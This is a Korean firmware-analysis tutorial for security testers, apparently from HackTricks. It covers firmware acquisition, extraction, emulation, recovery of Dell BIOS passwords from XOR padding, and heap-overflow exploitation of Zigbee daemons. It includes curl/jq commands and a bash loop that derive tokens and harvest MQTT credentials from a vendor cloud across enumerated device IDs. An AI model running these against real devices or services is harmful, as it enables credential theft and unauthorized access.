# 펌웨어 분석

{{#include ../../banners/hacktricks-training.md}}

{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/dds-rtps-security.md
{{#endref}}

## **소개**

### 관련 자료

{{#ref}}
uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

펌웨어는 하드웨어 구성 요소와 사용자가 상호작용하는 소프트웨어 간의 통신을 관리하고 지원하여 기기가 올바르게 작동하도록 하는 필수 소프트웨어입니다. 펌웨어는 영구 메모리에 저장되므로 기기의 전원이 켜지는 순간부터 중요한 명령에 접근할 수 있으며, 이를 통해 운영 체제가 시작됩니다. 보안 취약점을 식별하려면 펌웨어를 조사하고 필요에 따라 수정하는 과정이 중요합니다.<sup>[[2]](#references)[[3]](#references)</sup>

## **정보 수집**

**정보 수집**은 기기의 구성과 사용 기술을 파악하는 데 중요한 초기 단계입니다. 이 과정에서는 다음과 같은 데이터를 수집합니다.

- CPU 아키텍처 및 실행 중인 운영 체제
- 부트로더 세부 정보
- 하드웨어 구성 및 데이터시트
- 코드베이스 메트릭 및 소스 위치
- 외부 라이브러리 및 라이선스 유형
- 업데이트 기록 및 규제 인증
- 아키텍처 및 흐름도
- 보안 평가 및 식별된 취약점

이때 **오픈 소스 인텔리전스(OSINT)** 도구는 매우 유용하며, 수동 및 자동 검토를 통해 이용 가능한 오픈 소스 소프트웨어 구성 요소를 분석하는 것도 중요합니다. [Coverity Scan](https://scan.coverity.com) 및 [Semmle’s LGTM](https://lgtm.com/#explore)과 같은 도구는 잠재적인 문제를 찾는 데 활용할 수 있는 무료 정적 분석을 제공합니다.

## **펌웨어 획득**

펌웨어는 여러 가지 방법으로 획득할 수 있으며, 각 방법의 복잡도는 다릅니다.

- 개발자나 제조업체 등 출처에서 **직접 획득**
- 제공된 지침에 따라 **빌드**
- 공식 지원 사이트에서 **다운로드**
- 호스팅된 펌웨어 파일을 찾기 위해 **Google dork** 쿼리 활용
- [S3Scanner](https://github.com/sa7mon/S3Scanner)와 같은 도구를 사용해 **cloud storage**에 직접 접근
- man-in-the-middle 기법으로 **업데이트** 가로채기
- **UART**, **JTAG** 또는 **PICit** 같은 연결을 통해 기기에서 **추출**
- 기기 통신에서 업데이트 요청 **스니핑**
- **하드코딩된 업데이트 엔드포인트** 식별 및 사용
- 부트로더나 네트워크에서 **덤프**
- 다른 방법이 모두 실패하면 적절한 하드웨어 도구를 사용해 저장 칩을 **분리하고 읽기**

### UART 전용 로그: 플래시의 U-Boot 환경 변수를 이용해 root shell 강제 실행

UART RX가 무시되는 경우(로그만 출력되는 경우)에도 **U-Boot 환경 변수 blob을 오프라인에서 편집**해 init shell을 강제로 실행할 수 있습니다.<sup>[[6]](#references)</sup>

1. SOIC-8 클립과 프로그래머(3.3V)를 사용해 SPI flash를 덤프합니다.
   ```bash
   flashrom -p ch341a_spi -r flash.bin
   ```
2. U-Boot env 파티션을 찾고, `bootargs`를 수정해 `init=/bin/sh`를 포함시킨 다음 **blob의 U-Boot env CRC32를 다시 계산합니다**.
3. env 파티션만 다시 플래시하고 재부팅하면 UART에 shell이 나타납니다.

이 방법은 bootloader shell은 비활성화되어 있지만 외부 플래시 접근을 통해 env 파티션을 쓸 수 있는 임베디드 장치에서 유용합니다.

## 펌웨어 분석하기

이제 **펌웨어를 확보했으므로**, 펌웨어를 어떻게 다룰지 파악하기 위해 정보를 추출해야 합니다. 다음과 같은 다양한 도구를 사용할 수 있습니다:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```

해당 도구로 많은 정보를 찾지 못했다면 `binwalk -E <bin>`으로 이미지의 **entropy**를 확인하세요. entropy가 낮으면 암호화되지 않았을 가능성이 큽니다. entropy가 높으면 암호화되었거나 어떤 방식으로든 압축되었을 가능성이 큽니다.

또한 다음 도구를 사용해 **firmware 내부에 포함된 파일**을 추출할 수 있습니다:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

또는 [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/))를 사용해 파일을 검사할 수 있습니다.

### Differential flash analysis와 복구 가능한 XOR secret store

firmware 설정의 저장 형식이 문서화되어 있지 않다면, 먼저 동일한 flash를 여러 번 읽고, 설정을 **정확히 하나만** 변경한 다음, 전체 칩을 다시 dump하고 offset을 비교하세요. 제어된 값을 사용해 실험을 반복하면 해당 설정과 counter 및 write metadata를 구분할 수 있습니다. 제자리에서 변경되지 않고 새로운 offset에 변경 사항이 나타난다면 append-only 또는 log-structured 저장소일 수 있습니다. 삭제되었거나 tombstone 처리된 항목도 유지하세요. 해당 항목의 payload bytes를 복구할 수 있을 수 있습니다.<sup>[[10]](#references)[[11]](#references)</sup>

```bash
sha256sum baseline-1.bin baseline-2.bin baseline-3.bin
cmp -l baseline-1.bin changed.bin
```

영역을 찾은 후 `binwalk` 같은 도구로 펌웨어 모듈을 추출하고, Ghidra에서 writer/validator를 리버스 엔지니어링합니다. 암호문 패턴만으로 방식을 추측하지 말고, 코드에서 필드 경계, 패딩, 키 인덱싱, 키 유도를 확인합니다.<sup>[[10]](#references)</sup>

#### 암호화된 제로 패딩에서 키 복구

[XOR-based encryption](../../crypto/symmetric/#xor-based-encryption)에서 설명한 것처럼, 알려진 평문을 사용하면 같은 오프셋의 키스트림 바이트를 알아낼 수 있습니다. 반복되는 XOR 키의 모든 인덱스를 제로 패딩이 덮는 고정 크기 필드는 특히 취약합니다. `0x00 XOR key_byte = key_byte`이므로 암호화된 패딩에서 해당 키 바이트를 직접 알아낼 수 있습니다. 모든 키 인덱스가 포함되어 있다면 암호문의 끝부분에서 키를 복원하고, 데이터가 들어 있는 바이트를 복호화합니다.<sup>[[10]](#references)</sup>

Dell의 취약한 DVAR BIOS 암호 형식이 구체적인 예입니다. 32바이트 필드의 바이트 `0`은 평문이고, 바이트 `1..31`에는 20바이트 반복 키가 사용됩니다.<sup>[[10]](#references)</sup>

```text
stored[0] = password[0]
stored[i] = password[i] XOR key[(i - 1) mod 20]  # i = 1..31
```

비밀번호 길이가 `L`일 때, XOR 전에는 `L..31` 위치가 0이었습니다. `L <= 12`이면 이 위치들이 모든 키 인덱스를 포함하므로, brute force 없이 전체 키와 비밀번호를 복구할 수 있습니다:<sup>[[10]](#references)</sup>

```text
key[(i - 1) mod 20] = stored[i]                  # padding positions
password[i] = stored[i] XOR key[(i - 1) mod 20] # populated positions
```

#### 과거 기록에서 키 가져오기

각 기록을 독립적으로 분석하지 마세요. DVAR 키는 대략 `modified_md5(device_seed || variable_GUID || password[0])`에서 파생됩니다. device seed와 GUID는 고정되어 있고, password에 따라 달라지는 입력은 평문 첫 바이트뿐입니다. 따라서 장치당 가능한 키는 최대 256개이며, 같은 바이트로 시작하는 기록은 같은 키를 공유합니다. 활성 기록과 삭제된 기록을 해당 바이트별로 그룹화하세요. 짧은 과거 기록은 패딩을 통해 전체 키를 leak할 수 있으며, 자체 패딩만으로는 부족한 현재의 더 긴 기록을 복호화하는 데 이 키를 사용할 수 있습니다. 따라서 이전 암호문의 데이터가 삭제 표시만 되고 실제로 지워지지 않았다면, 암호를 바꾸는 것이 오히려 노출을 늘릴 수 있습니다.<sup>[[10]](#references)</sup>

[`dellpwn`](https://github.com/R3n5k1/dellpwn) 도구는 DVAR를 찾고, 후보 기록을 검증하며, 암호를 복구하고, 저장된 원시 바이트와 키 바이트를 표시할 수 있습니다. 저장소를 checkout한 뒤 다음과 같이 검증된 플래시 이미지를 검사하세요.<sup>[[11]](#references)</sup>

```bash
cargo install --path .
dellpwn scan dump.bin --raw
dellpwn scan dump.bin --partial  # include uncertain recoveries
```

For custom parser의 경우, record 구조, printable-character 제약, zero-padding 검사, key entropy, 그리고 key가 순환할 때의 일관성을 사용해 false positive를 거부하세요. 반복 덤프에서 쓰기마다 드문 bit flip이 관찰되면, 관찰된 mask를 열거하고 이러한 제약을 기준으로 복구 후보의 순위를 매기되, 휴리스틱 결과를 정확한 복구 결과처럼 제시하지 말고 모호한 문자는 모호하다고 보고하세요.<sup>[[10]](#references)</sup>

Password verifier는 복호화 가능한 ciphertext 대신 salt를 적용하고 반복 연산한 단방향 hash를 저장해야 하며, log-structured 저장소는 대체된 secret 자료를 안전하게 제거해야 합니다.<sup>[[10]](#references)</sup>

### 파일 시스템 가져오기

앞서 주석 처리된 도구인 `binwalk -ev <bin>`을 사용했다면 **파일 시스템을 추출**할 수 있었을 것입니다.\
Binwalk는 보통 파일 시스템 유형에 따라 이름이 지정된 **폴더 안에 추출**하며, 일반적으로 다음 중 하나입니다: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### 파일 시스템 수동 추출

때로는 binwalk의 signature에 파일 시스템의 **magic byte가 포함되어 있지 않을 수 있습니다**. 이 경우 binwalk를 사용해 **파일 시스템의 offset을 찾고 압축된 파일 시스템을 바이너리에서 carve한 다음**, 아래 단계에 따라 유형에 맞게 파일 시스템을 **수동으로 추출**하세요.

```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```

다음 **dd 명령어**를 실행하여 Squashfs 파일 시스템을 carving합니다.

```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```

또는 다음 명령을 실행할 수도 있습니다.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- squashfs (위 예시에서 사용)

`$ unsquashfs dir.squashfs`

이후 파일은 "`squashfs-root`" 디렉터리에 저장됩니다.

- CPIO 아카이브 파일

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- jffs2 파일시스템

`$ jefferson rootfsfile.jffs2`

- NAND flash를 사용하는 ubifs 파일시스템

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## 펌웨어 분석

펌웨어를 확보한 후에는 구조와 잠재적 취약점을 파악하기 위해 이를 분석하는 것이 중요합니다. 이 과정에서는 다양한 도구를 사용해 펌웨어 이미지를 분석하고 유용한 데이터를 추출합니다.

### 초기 분석 도구

바이너리 파일(`<bin>`으로 표시)을 처음 검사하기 위한 명령어 모음이 제공됩니다. 이 명령어들은 파일 유형 식별, 문자열 추출, 바이너리 데이터 분석, 파티션 및 파일시스템 세부 정보 파악에 도움이 됩니다:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```

이미지의 암호화 상태를 평가하려면 `binwalk -E <bin>`으로 **엔트로피**를 확인합니다. 엔트로피가 낮으면 암호화되지 않았을 가능성이 높고, 높으면 암호화 또는 압축되었을 가능성이 있습니다.

**포함된 파일**을 추출하려면 **file-data-carving-recovery-tools** 문서와 파일 검사용 **binvis.io** 같은 도구와 리소스를 권장합니다.

### 파일 시스템 추출

`binwalk -ev <bin>`을 사용하면 일반적으로 파일 시스템을 추출할 수 있으며, 대개 파일 시스템 유형(예: squashfs, ubifs)을 이름으로 하는 디렉터리에 저장됩니다. 하지만 magic bytes가 없어 **binwalk**가 파일 시스템 유형을 인식하지 못하면 수동으로 추출해야 합니다. `binwalk`로 파일 시스템의 오프셋을 찾은 다음 `dd` 명령으로 파일 시스템을 추출합니다:

```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```

이후 파일 시스템 유형(squashfs, cpio, jffs2, ubifs 등)에 따라 콘텐츠를 수동으로 추출하는 데 서로 다른 명령을 사용합니다.

### 파일 시스템 분석

파일 시스템을 추출하면 보안 결함을 찾기 시작합니다. 안전하지 않은 네트워크 데몬, 하드코딩된 자격 증명, API 엔드포인트, 업데이트 서버 기능, 컴파일되지 않은 코드, 시작 스크립트, 오프라인 분석을 위한 컴파일된 바이너리를 중점적으로 살펴봅니다.

점검해야 할 **주요 위치**와 **항목**은 다음과 같습니다.

- 사용자 자격 증명이 있는 **etc/shadow** 및 **etc/passwd**
- **etc/ssl**의 SSL 인증서와 키
- 잠재적 취약점이 있는 구성 파일 및 스크립트 파일
- 추가 분석을 위한 임베디드 바이너리
- 일반적인 IoT 기기 웹 서버 및 바이너리

파일 시스템 내 민감한 정보와 취약점을 찾는 데 다음 도구들이 도움이 됩니다.

- 민감한 정보 검색용 [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) 및 [**Firmwalker**](https://github.com/craigz28/firmwalker)
- 포괄적인 펌웨어 분석용 [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core)
- 정적 및 동적 분석용 [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go), [**EMBA**](https://github.com/e-m-b-a/emba)

### 컴파일된 바이너리의 보안 점검

파일 시스템에서 발견된 소스 코드와 컴파일된 바이너리 모두 취약점이 있는지 면밀히 조사해야 합니다. Unix 바이너리용 **checksec.sh** 및 Windows 바이너리용 **PESecurity** 같은 도구는 악용될 수 있는 보호되지 않은 바이너리를 식별하는 데 도움이 됩니다.

## 파생 URL 토큰을 통한 cloud 구성 및 MQTT 자격 증명 수집

많은 IoT 허브는 다음과 같은 cloud 엔드포인트에서 기기별 구성을 가져옵니다.<sup>[[5]](#references)</sup>

- `https://<api-host>/pf/<deviceId>/<token>`

펌웨어 분석 중에 `<token>`이 하드코딩된 비밀 키를 사용해 기기 ID에서 로컬로 파생된다는 것을 발견할 수 있습니다. 예를 들면 다음과 같습니다.

- token = MD5( deviceId || STATIC_KEY ) and represented as uppercase hex

이 설계에서는 누군가가 deviceId와 STATIC_KEY를 알아내면 URL을 재구성해 cloud 구성을 가져올 수 있으며, 여기에는 평문 MQTT 자격 증명과 토픽 접두사가 포함되는 경우가 많습니다.

실제 작업 순서:

1) UART 부팅 로그에서 deviceId 추출

- 3.3V UART 어댑터(TX/RX/GND)를 연결하고 로그를 캡처합니다:

```bash
picocom -b 115200 /dev/ttyUSB0
```

- cloud config URL 패턴과 broker 주소를 출력하는 줄을 찾습니다. 예를 들면:

```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```

2) 펌웨어에서 STATIC_KEY 및 token 알고리즘 복구

- 바이너리를 Ghidra/radare2에 로드하고 config 경로("/pf/") 또는 MD5 사용 여부를 검색합니다.
- 알고리즘을 확인합니다(예: MD5(deviceId||STATIC_KEY)).
- Bash에서 token을 생성하고 digest를 대문자로 변환합니다:

```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```

3) cloud config 및 MQTT credentials 수집

- URL을 구성하고 curl로 JSON을 가져온 다음, jq로 파싱해 secrets를 추출합니다:

```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```

4) 평문 MQTT 및 취약한 topic ACL 악용(있는 경우)

- 복구한 자격 증명을 사용해 maintenance topic을 구독하고 민감한 이벤트를 찾아봅니다:

```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
  -i <client_id> -u <username> -P <password> \
  -t "<topic_prefix>/<deviceId>/admin" -v
```

5) 예측 가능한 장치 ID 열거 (대규모로, 승인된 범위에서)

- 많은 에코시스템은 공급업체 OUI/제품/유형 바이트 뒤에 순차 접미사를 붙입니다.
- 후보 ID를 순회하고, 토큰을 도출한 다음, 프로그래밍 방식으로 설정을 가져올 수 있습니다:

```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
  DEVICE_ID="${PREFIX}${SUF}"
  TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
  curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```

메모
- 대량 열거를 시도하기 전에 항상 명시적인 승인을 받으세요.
- 가능한 경우 대상 하드웨어를 수정하지 않고 비밀을 복구할 수 있도록 에뮬레이션이나 정적 분석을 우선하세요.


펌웨어를 에뮬레이션하면 기기의 작동이나 개별 프로그램에 대한 **동적 분석**이 가능합니다. 이 접근 방식은 하드웨어 또는 아키텍처 종속성으로 인해 어려움을 겪을 수 있지만, Raspberry Pi와 같이 아키텍처와 엔디언이 일치하는 기기나 미리 빌드된 가상 머신으로 root filesystem 또는 특정 바이너리를 옮기면 추가 테스트를 진행할 수 있습니다.

### 개별 바이너리 에뮬레이션

단일 프로그램을 검사할 때는 프로그램의 엔디언과 CPU 아키텍처를 파악하는 것이 중요합니다.

#### MIPS 아키텍처 예제

MIPS 아키텍처 바이너리를 에뮬레이션하려면 다음 명령을 사용할 수 있습니다:

```bash
file ./squashfs-root/bin/busybox
```

그리고 필요한 에뮬레이션 도구를 설치하려면:

```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```

MIPS(big-endian)의 경우 `qemu-mips`를 사용하며, little-endian 바이너리에는 `qemu-mipsel`을 선택합니다.

#### ARM Architecture Emulation

ARM 바이너리의 경우에도 과정은 비슷하며, 에뮬레이션에는 `qemu-arm` 에뮬레이터를 사용합니다.

### Full System Emulation

[Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) 등의 도구는 전체 펌웨어 에뮬레이션을 지원하고, 이 과정을 자동화하여 동적 분석을 돕습니다.

### Reconstructing split and verified root filesystems for emulation

SquashFS superblock은 읽을 수 있지만 inode, directory 또는 fragment-table 오프셋이 말이 되지 않는 경우, 섣불리 `unsquashfs`를 패치하지 마세요. 초기 부팅 바이너리를 역분석하고 해당 바이너리가 생성하는 블록 장치 그래프를 재현하세요. 임베디드 시스템은 명목상 root 파티션을 노출하면서도 다른 파티션에서 가져온 섹터를 덧붙이는 `dm-linear` 매핑을 통해 실제 파일시스템을 구성할 수 있습니다. superblock만 확인하면 통과하더라도 이후의 모든 메타데이터 블록은 어긋나 있을 수 있습니다.<sup>[[9]](#references)</sup>

펌웨어의 산술 연산을 정확히 보존하세요. 특히 길이 단위가 바이트, 512바이트 섹터 또는 4 KiB 페이지 중 무엇인지 확인하고, 시프트와 절삭을 원래 순서대로 재현하며, A/B 레이아웃에서 뱅크에 따라 달라지는 끝부분 영역도 고려해야 합니다. 예를 들어 `(partition_bytes >> 12) << 3`은 먼저 4 KiB 경계로 절삭한 다음 결과를 512바이트 섹터 단위로 나타냅니다. 이를 `partition_bytes // 512`로 바꾸면 추가되는 영역의 위치가 몇 킬로바이트 어긋나 모든 후속 SquashFS 테이블이 손상될 수 있습니다.<sup>[[9]](#references)</sup>

유용한 검증 워크플로는 다음과 같습니다.<sup>[[9]](#references)</sup>

1. verifier/init 바이너리에서 각 `dm-linear` 세그먼트의 소스 장치, 시작 섹터 및 길이를 파악합니다.
2. 정렬 의미를 바꾸지 않고 영역을 연결하거나 매핑합니다.
3. 추출에 계속 실패하면 예상 경계 주변의 좁은 범위만 검색하고, 그럴듯한 superblock 하나만으로 판단하지 말고 연속된 여러 개의 유효한 메타데이터 구조가 있는지 확인합니다.
4. 재구성한 이미지에 수정하지 않은 `unsquashfs`를 실행합니다. 모든 디렉터리와 fragment를 순회하는 데 성공하는 것이 `unsquashfs -stat`보다 강력한 증거입니다.

#### Analyst-controlled dm-verity replacement

분석가가 QEMU 커널, initramfs 및 가상 디스크를 제어하는 경우, 공급업체의 검증용 PID 1을 작은 정적 링크 init으로 교체하여 수정된 root를 부팅할 수 있습니다. 이는 **lab boot-chain substitution**이며, dm-verity, RSA 서명, Secure Boot 또는 TPM으로 봉인된 키를 깨는 것이 아닙니다.<sup>[[9]](#references)</sup>

대체 init은 원래 부팅 경로의 실질적인 부분을 그대로 따라야 합니다. `devtmpfs`를 마운트하고, `setsid()`를 호출하며, `/dev/console`을 파일 디스크립터 0–2에 연결하고, `/proc` 및 `/sys`를 마운트하며, 제공된 블록 장치를 기다린 다음 수정된 root를 읽기 전용으로 마운트합니다. 이어서 기존 root의 pseudo-filesystem을 분리하고, 새 마운트를 `/`에 옮긴 뒤 `chroot`하고, 펌웨어의 원래 `/sbin/init`을 `execve()`로 실행합니다. `MS_MOVE` **전에** `/dev`, `/proc` 및 `/sys`를 분리하면 새 root에 속한 마운트 지점이 실수로 분리되는 일을 방지할 수 있습니다.<sup>[[9]](#references)</sup>

변경 가능한 장치 상태는 수정된 불변 root와 분리해 두세요. qcow2 오버레이를 사용하면 원본 디스크의 LVM 상태를 보존하면서, 두 번째 읽기 전용 virtio 디스크로 수정된 SquashFS를 제공할 수 있습니다.<sup>[[9]](#references)</sup>

```bash
qemu-img create -f qcow2 -F raw -b emmc.raw overlay.qcow2
qemu-system-x86_64 ... -kernel bzImage -initrd custom-initramfs.cpio.gz \
  -drive if=none,id=emmc,format=qcow2,file=overlay.qcow2 \
  -device sdhci-pci -device sd-card,drive=emmc \
  -drive if=virtio,format=raw,readonly=on,file=rootfs-edited.squashfs
```

#### 오프라인 이미지 상태 디버깅

느린 부팅, 파괴적인 시작 스크립트 또는 신뢰할 수 없는 콘솔 로깅 때문에 오류 원인이 불분명할 때는 guest 외부에서 영구 상태를 검사합니다. 실행 중인 VM이 사용하는 overlay는 절대 연결하지 마세요. `qemu-nbd`로 노출하고, LVM 검색 범위를 의도한 NBD 파티션으로 제한한 다음, 연결을 해제하기 전에 볼륨 그룹을 비활성화하세요.<sup>[[9]](#references)</sup>

```bash
sudo modprobe nbd max_part=16
sudo qemu-nbd --connect=/dev/nbd0 overlay.qcow2
sudo vgscan --config 'devices { filter = ["a|/dev/nbd0p4|", "r|.*|"] }'
# inspect/fsck/mount the discovered logical volumes
sudo vgchange -an VG_NAME
sudo qemu-nbd --disconnect /dev/nbd0
```

재현 가능한 결함 격리를 위해 안정적으로 쓸 수 있는 볼륨에 타임스탬프가 포함된 마커 파일을 기록하고 오프라인에서 확인하세요. `/dev/kmsg`, FIFO, 일시적인 콘솔은 속도 제한이나 프로세스 조기 종료로 인해 잘못된 음성 결과를 낼 수 있습니다. 또한 관련 없는 코드를 변경하기 전에 계층 간 인터페이스가 정확히 일치하는지 비교하세요. `uname -r`과 `/lib/modules/`, 디스크에 있는 ext4 기능과 커널 구성, Mesa `libGL` 세대와 DRI 드라이버 ABI 및 PCI에서 유래한 드라이버 이름을 비교하면 됩니다. 구성 요소가 존재하고 `dlopen()`에 성공하더라도, 이를 사용하는 쪽에서 다른 ABI를 기대하면 사용할 수 없습니다.<sup>[[9]](#references)</sup>

## 실전 동적 분석

이 단계에서는 실제 또는 에뮬레이트된 장치 환경을 분석에 사용합니다. OS와 파일 시스템에 대한 셸 접근을 유지하는 것이 필수입니다. 에뮬레이션이 하드웨어 상호작용을 완벽하게 모방하지 못할 수 있으므로, 때때로 에뮬레이션을 다시 시작해야 합니다. 분석 시 파일 시스템을 다시 살펴보고, 노출된 웹페이지와 네트워크 서비스를 exploit하고, 부트로더 취약점을 조사해야 합니다. 잠재적인 백도어 취약점을 식별하려면 펌웨어 무결성 테스트가 중요합니다.

## 런타임 분석 기법

런타임 분석은 프로세스나 바이너리가 실행되는 환경에서 상호작용하는 과정입니다. gdb-multiarch, Frida, Ghidra 같은 도구를 사용해 중단점을 설정하고, 퍼징 등의 기법으로 취약점을 식별합니다.

전체 디버거를 사용할 수 없는 임베디드 대상에서는 **정적으로 링크된 `gdbserver`를 장치에 복사한 다음 원격으로 연결하세요**:<sup>[[6]](#references)</sup>

```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```

### Zigbee / radio-co-processor 메시지 매핑

IoT 허브에서는 RF 스택이 **radio MCU**와 Linux userland 프로세스 사이에 분리되어 있는 경우가 많습니다. 유용한 워크플로는 다음 경로를 매핑하는 것입니다:<sup>[[8]](#references)</sup>

1. 무선상의 **RF frame**
2. radio MCU의 **controller-side parser**
3. Linux로 전달되는 **serial/UART 텍스트 또는 TLV 프로토콜**(예: `/dev/tty*`)
4. 메인 daemon의 **application dispatcher**
5. **프로토콜별 handler / state machine**

이 아키텍처에는 하나가 아닌 두 개의 리버싱 대상이 있습니다. controller가 binary radio frame을 `Group,Command,arg1,arg2,...` 같은 텍스트 프로토콜로 변환한다면, 다음을 파악합니다.

- **메시지 그룹**과 dispatch table
- 어떤 메시지가 **네트워크**에서 올 수 있고 어떤 메시지가 controller 자체에서 오는지
- 정확한 **제조업체별 판별 필드**(예: Zigbee `manufacturer_code` 및 사용자 지정 `cluster_command`)
- **commissioning**, discovery 또는 firmware/model 다운로드 단계에서만 도달 가능한 handler

특히 Zigbee에서는 pairing 트래픽을 캡처하고 대상이 여전히 기본 **Link Key** `ZigBeeAlliance09`에 의존하는지 확인합니다. 그렇다면 commissioning 트래픽 스니핑으로 **Network Key**가 노출될 수 있습니다. Zigbee 3.0 install code는 이러한 노출을 줄이므로, 테스트한 장치가 실제로 이를 강제하는지 기록합니다.

### 제조업체별 프로토콜 handler 및 FSM으로 제한되는 도달 가능성

제조업체별 Zigbee/ZCL 명령은 표준 cluster보다 더 나은 대상인 경우가 많습니다. 검증이 충분히 이루어지지 않은 **사용자 지정 파싱 코드**와 내부 **FSM**으로 이어지기 때문입니다.<sup>[[8]](#references)</sup>

실용적인 워크플로:

- command dispatcher를 리버스하여 **vendor 전용 handler**를 찾습니다.
- **FSM state**, **event**, **check**, **action**, **next-state** table을 복원합니다.
- 자동으로 다음 상태로 넘어가는 **transitional state**와, 결국 공격자가 제어하는 state를 초기화하거나 해제하는 retry/error branch를 식별합니다.
- 버그가 있는 handler에 항상 도달할 수 있다고 가정하지 말고, daemon을 취약한 state로 전환하는 데 필요한 정상적인 프로토콜 교환을 확인합니다.

타이밍에 민감한 프로토콜에서는 Python framework를 통한 packet replay가 너무 느릴 수 있습니다. 더 안정적인 방법은 **nRF52840** 같은 실제 하드웨어와 제조업체 수준의 stack으로 정상 장치를 에뮬레이션해 올바른 **endpoint**, **attribute**, commissioning 타이밍을 구현하는 것입니다.

### 임베디드 daemon의 fragmented-download 버그 유형

**분할된 blob/model/configuration 다운로드**에서 반복적으로 나타나는 firmware 버그 유형입니다:<sup>[[8]](#references)</sup>

1. **첫 번째 fragment**(`offset == 0`)가 `ctx->total_size`를 저장하고 `malloc(total_size)`를 할당합니다.
2. 이후 fragment는 `packet_total_size >= offset + chunk_len`처럼 공격자가 제어하는 **패킷 단위** 필드만 검증합니다.
3. 복사 과정에서 원래 할당된 크기와 비교하지 않고 `memcpy(&ctx->buffer[offset], chunk, chunk_len)`을 실행합니다.

공격자는 다음을 보낼 수 있습니다.

- 작은 heap 할당을 유도하는 **작은** 선언 크기의 유효한 첫 fragment
- **예상 offset**을 사용하지만 더 큰 `chunk_len`을 지정한 후속 fragment
- 새 검증은 통과하면서 원래 할당된 buffer는 overflow시키는 위조된 패킷 단위 크기

취약한 경로가 commissioning 로직 뒤에 있다면, 잘못된 fragment를 보내기 전에 대상이 예상된 model-download 또는 blob-download state로 진입하도록 충분한 **장치 에뮬레이션**을 포함해야 합니다.

### 프로토콜 기반 `free()` 트리거

임베디드 daemon에서 heap metadata exploitation을 트리거하는 가장 쉬운 방법은 흔히 "정리 작업을 기다리는 것"이 아니라 **프로토콜 자체의 오류 처리를 강제하는 것**입니다:<sup>[[8]](#references)</sup>

- 잘못된 후속 fragment를 보내 FSM을 **retry** 또는 **error** state로 전환합니다.
- retry 한도를 초과시켜 daemon이 **context를 초기화**하고 손상된 buffer를 해제하도록 합니다.
- 이 예측 가능한 `free()`를 사용해 다른 이유로 프로세스가 충돌하기 전에 allocator 측 primitive를 트리거합니다.

이는 chunk metadata 손상으로 unlink/unbin 로직을 write primitive로 바꿀 수 있는 임베디드 Linux의 **musl/uClibc/dlmalloc 계열** allocator를 공격할 때 특히 유용합니다. 안정적인 방식은 실제 bin pointer를 즉시 덮어써 프로세스를 충돌시키는 대신, **size field**를 손상시켜 overflow된 buffer 안에 배치한 **fake chunk**를 따라가도록 allocator traversal을 유도하는 것입니다.

